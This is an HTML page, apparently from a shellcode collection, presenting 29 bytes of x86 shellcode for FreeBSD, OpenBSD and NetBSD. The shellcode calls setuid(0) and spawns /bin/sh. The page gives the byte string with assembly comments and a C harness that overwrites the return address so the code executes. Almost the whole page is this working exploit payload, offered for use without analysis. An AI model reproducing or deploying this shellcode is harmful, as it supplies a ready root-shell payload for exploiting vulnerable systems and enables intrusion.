<html><head><title>BSD/x86 - execve(/bin/sh) &amp; setuid(0) - 29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   29 bytes.

   -setuid(0);
   -execve(/bin/sh);
*/

char shellcode[]=

   &quot;\x31\xc0&quot;                      // xor          %eax,%eax
   &quot;\x50&quot;                          // push         %eax
   &quot;\xb0\x17&quot;                      // mov          $0x17,%al
   &quot;\x50&quot;                          // push         %eax
   &quot;\xcd\x80&quot;                      // int          $0x80
   &quot;\x50&quot;                          // push         %eax
   &quot;\x68\x6e\x2f\x73\x68&quot;          // push         $0x68732f6e
   &quot;\x68\x2f\x2f\x62\x69&quot;          // push         $0x69622f2f
   &quot;\x89\xe3&quot;                      // mov          %esp,%ebx
   &quot;\x50&quot;                          // push         %eax
   &quot;\x54&quot;                          // push         %esp
   &quot;\x53&quot;                          // push         %ebx
   &quot;\x50&quot;                          // push         %eax
   &quot;\xb0\x3b&quot;                      // mov          $0x3b,%al
   &quot;\xcd\x80&quot;;                     // int          $0x80

main()
{
   int *ret;
   printf(&quot;Shellcode lenght=%d\n&quot;,sizeof(shellcode));
   ret=(int*)&amp;ret+2;
   (*ret)=(int)shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
